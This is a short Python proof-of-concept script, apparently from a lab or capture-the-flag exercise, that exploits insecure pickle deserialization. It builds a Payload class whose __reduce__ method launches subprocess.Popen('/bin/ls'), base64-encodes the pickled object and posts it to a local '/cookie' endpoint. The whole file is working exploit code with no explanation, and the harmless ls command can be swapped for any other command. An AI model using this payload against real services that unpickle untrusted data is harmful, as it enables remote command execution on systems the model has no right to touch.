import requests
import pickle
import subprocess
import zmq
from base64 import b64decode,b64encode
 
class Payload(object):
    def __reduce__(self):
        return (subprocess.Popen, (('/bin/ls',),))

payload = {
    'value': b64encode(pickle.dumps(Payload()))
}

print(payload)

# Use 'with' to ensure the session context is closed after use.
with requests.Session() as s:
    p = s.post('http://127.0.0.1:4000/cookie', data=payload)